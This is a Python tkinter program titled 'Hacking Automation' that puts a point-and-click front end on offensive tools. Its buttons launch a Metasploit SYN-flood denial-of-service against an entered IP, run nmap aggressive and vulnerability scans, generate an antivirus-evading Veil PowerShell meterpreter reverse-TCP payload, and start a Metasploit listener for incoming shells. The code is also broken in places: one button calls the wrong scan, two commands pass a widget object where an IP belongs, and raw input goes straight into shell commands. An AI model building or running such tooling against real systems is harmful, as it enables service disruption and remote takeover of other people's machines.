#Imports
import tkinter as tk
from tkinter import ttk
from tkinter import filedialog
from tkinter.font import Font
import subprocess
import time

class App():
    def __init__(self, master):
        app_frame = tk.Frame(master, borderwidth=0,)
        app_frame.grid(row=0, sticky="W")

        # styling variables for widgets
        self.style_menu = {"bg": "#000000", "fg": "white", "width": 20, "height": 2, "borderwidth": 0, "font": "bold"}
        self.style_menu2 = {"bg": "#000000", "fg": "white", "borderwidth": 0, "padx": 45, "pady": 4}
        self.style_entry_box = {"fg": "#000000", "highlightbackground": "#000000",
                                "highlightcolor": "#000000", "highlightthickness": 0.5}
        self.style_basic = {"fg": "#000000", "borderwidth": 0}
        self.style_button = {"bg": "#ffffff", "fg": "#000000", "bd": 1, "relief": "solid"}
        self.style_title = Font(size=20, weight="bold")
        self.style_font = Font(size=10)

        #Frame 1 for titels
        self.frame_1 = tk.LabelFrame(bg="#ededed", borderwidth=0)
        self.frame_1.grid(row=0, column=1, pady=5, sticky="W")

        #Frame 2 for setup
        self.frame_2 = tk.LabelFrame(bg="#ededed", borderwidth=0)
        self.frame_2.grid(row=1, column=1, pady=0, sticky="W")

        #Frame 3 for Output
        self.frame_3 = tk.LabelFrame(bg="#ededed", borderwidth=0)
        self.frame_3.grid(row=2, column=1, pady=10, sticky="W")

        #All menu buttons

        #Metasploit Dos button
        self.meta_dos_button = tk.Button(app_frame, text="Metasploit Dos", **self.style_menu, command=self.meta_dos)
        self.meta_dos_button.grid(row=0, column=0)

        #Nmap aggressive scan
        self.nmap_scan_agrs_button = tk.Button(app_frame, text="Nmap aggressive scan", **self.style_menu, command=self.nmap_scan_agrs)
        self.nmap_scan_agrs_button.grid(row=1, column=0)

        # Nmap vulnability scan
        self.nmap_scan_vuln_button = tk.Button(app_frame, text="Nmap vulnerability scan", **self.style_menu, command=self.nmap_scan_vuln)
        self.nmap_scan_vuln_button.grid(row=2, column=0)

        # Nmap vulnability scan
        self.remote_access_button = tk.Button(app_frame, text="Payload & Listener", **self.style_menu, command=self.remote_access)
        self.remote_access_button.grid(row=3, column=0)

    #Metasploit function executable
    def meta_dos(self):
        for widget in self.frame_1.winfo_children():
            widget.destroy()
        for widget in self.frame_2.winfo_children():
            widget.destroy()
        for widget in self.frame_3.winfo_children():
            widget.destroy()

        # Meta title
        self.meta_dos_title = tk.Label(self.frame_1, text="Metasploit DoS SYN-flood", **self.style_basic,
        font=self.style_title).grid(row=0, column=0, sticky="W", padx=100)

        # Meta label IP
        self.meta_dos_label_ip = tk.Label(self.frame_2, text="Target IP ", **self.style_basic)
        self.meta_dos_label_ip.grid(row=0, column=0, pady=10, padx=20, sticky="W")

        # Meta entry IP box
        self.meta_dos_entry_ip = tk.Entry(self.frame_2, **self.style_entry_box)
        self.meta_dos_entry_ip.grid(row=0, column=1, pady=10, padx=10, sticky="W")

        # Meta number of packets
        self.meta_dos_label_packets = tk.Label(self.frame_2, text="Number of packets ", **self.style_basic)
        self.meta_dos_label_packets.grid(row=1, column=0, pady=10, padx=20, sticky="W")

        # Meta entry IP box
        self.meta_dos_entry_packets = tk.Entry(self.frame_2, **self.style_entry_box)
        self.meta_dos_entry_packets.grid(row=1, column=1, pady=10, padx=10, sticky="W")


        #Meta call execute function
        self.meta_dos_entry_execute = tk.Button(self.frame_2, text="Execute", **self.style_button,
        command=self.meta_dos_exe)
        self.meta_dos_entry_execute.grid(row=1, column=2, padx=20)

    #Meta execute function
    def meta_dos_exe(self):
        meta_dos = subprocess.run(f"sudo msfconsole -q -x 'use auxiliary/dos/tcp/synflood; set RHOSTS {self.meta_dos_entry_ip.get()}; set NUM {self.meta_dos_entry_packets.get()}; run; exit'", shell=True, capture_output=True)

        # Outout box/results
        self.output_meta_dos = tk.Text(self.frame_3, width=50, height=10, **self.style_entry_box)
        self.output_meta_dos .grid(row=0, column=0, pady=5, padx=3, sticky="W")
        self.output_meta_dos .insert(tk.END, meta_dos)

    #Nmap function executable
    def nmap_scan_agrs(self):
        for widget in self.frame_1.winfo_children():
            widget.destroy()
        for widget in self.frame_2.winfo_children():
            widget.destroy()
        for widget in self.frame_3.winfo_children():
            widget.destroy()

        #Nmap title
        self.nmap_scan_agrs_title = tk.Label(self.frame_1, text="Nmap aggressive port scan", **self.style_basic,
        font=self.style_title).grid(row=0, column=0, sticky="W", padx=100)

        #Nmap label IP
        self.nmap_scan_agrs_label_ip = tk.Label(self.frame_2, text="Target IP ", **self.style_basic)
        self.nmap_scan_agrs_label_ip.grid(row=0, column=0, pady=10, padx=20, sticky="W")

        self.nmap_scan_agrs_entry = tk.Entry(self.frame_2, **self.style_entry_box)
        self.nmap_scan_agrs_entry.grid(row=0, column=1, pady=10, padx=10, sticky="W")

        self.nmap_scan_agrs_execute = tk.Button(self.frame_2, text="Execute", **self.style_button, command=self.nmap_scan_agrs_exe)
        self.nmap_scan_agrs_execute.grid(row=0, column=2, padx=20)

    #nmap execute function
    def nmap_scan_agrs_exe(self):
        #Command line
        nmap_output = subprocess.run(f"nmap -A {self.nmap_scan_agrs_entry.get()} ", shell=True, capture_output=True)

        #Outout box/results
        self.output_nmap_agrs = tk.Text(self.frame_3, width=50, height=10, **self.style_entry_box)
        self.output_nmap_agrs.grid(row=0, column=0, pady=5, padx=3, sticky="W")
        self.output_nmap_agrs.insert(tk.END, nmap_output)

    #Nmap vulnerablity scan
    def nmap_scan_vuln(self):
        for widget in self.frame_1.winfo_children():
            widget.destroy()
        for widget in self.frame_2.winfo_children():
            widget.destroy()
        for widget in self.frame_3.winfo_children():
            widget.destroy()

        #Nmap title
        self.nmap_scan_vuln_title = tk.Label(self.frame_1, text="Nmap vulnerability scan", **self.style_basic,
        font=self.style_title).grid(row=0, column=0, sticky="W", padx=100)

        #Nmap label IP
        self.nmap_scan_vuln_label_ip = tk.Label(self.frame_2, text="Target IP ", **self.style_basic)
        self.nmap_scan_vuln_label_ip.grid(row=0, column=0, pady=10, padx=20, sticky="W")

        self.nmap_scan_vuln_entry = tk.Entry(self.frame_2, **self.style_entry_box)
        self.nmap_scan_vuln_entry.grid(row=0, column=1, pady=10, padx=10, sticky="W")

        self.nmap_scan_vuln_execute = tk.Button(self.frame_2, text="Execute", **self.style_button, command=self.nmap_scan_agrs_exe)
        self.nmap_scan_vuln_execute.grid(row=0, column=2, padx=20)

    def nmap_scan_vuln_exe(self):
        # Command line
        nmap_output = subprocess.run(f"nmap --script vuln {self.nmap_scan_agrs_entry.get()} ", shell=True, capture_output=True)

        # Outout box/results
        self.output_nmap_vuln = tk.Text(self.frame_3, width=50, height=10, **self.style_entry_box)
        self.output_nmap_vuln.grid(row=0, column=0, pady=5, padx=3, sticky="W")
        self.output_nmap_vuln.insert(tk.END, nmap_output)

    def remote_access(self):
        for widget in self.frame_1.winfo_children():
            widget.destroy()
        for widget in self.frame_2.winfo_children():
            widget.destroy()
        for widget in self.frame_3.winfo_children():
            widget.destroy()

        #Title
        self.remote_access_title = tk.Label(self.frame_1, text="Payload generation and listener", **self.style_basic,
        font=self.style_title).grid(row=0, column=0, sticky="W", padx=100)

        #payload name
        self.remote_access_label_name = tk.Label(self.frame_2, text="Payload name ", **self.style_basic)
        self.remote_access_label_name.grid(row=0, column=0, pady=10, padx=20, sticky="W")

        self.remote_access_entry_name = tk.Entry(self.frame_2, **self.style_entry_box)
        self.remote_access_entry_name.grid(row=0, column=1, pady=10, padx=10, sticky="W")

        #payload attack IP
        self.remote_access_label_ip = tk.Label(self.frame_2, text="Attackers IP ", **self.style_basic)
        self.remote_access_label_ip.grid(row=1, column=0, pady=10, padx=20, sticky="W")

        self.remote_access_entry_ip = tk.Entry(self.frame_2, **self.style_entry_box)
        self.remote_access_entry_ip.grid(row=1, column=1, pady=10, padx=10, sticky="W")

        self.generate_payload = tk.Button(self.frame_2, text="Generate", **self.style_button, command=self.payload_generate)
        self.generate_payload.grid(row=2, column=0, padx=20)

        self.multihandler = tk.Button(self.frame_2, text="Start Listener", **self.style_button, command=self.listner_start)
        self.multihandler.grid(row=2, column=1, padx=20)

    def payload_generate(self):
        # Command line
        subprocess.run(f"veil -t evasion -p powershell/meterpreter/rev_tcp.py -o {self.remote_access_entry_name.get()} --ip {self.remote_access_entry_ip} ", shell=True, capture_output=True)


    def listner_start(self):
        # Command line
        subprocess.run(f"sudo msfconsole -q -x 'use multi/handler; set LHOST {self.remote_access_entry_ip}; run'", shell=True, capture_output=True)

def main():
    root = tk.Tk()
    root.title("Hacking Automation")
    root.configure(bg="#ededed")
    root.geometry("969x700")
    App(root)
    root.mainloop()

if __name__ == "__main__":
    main()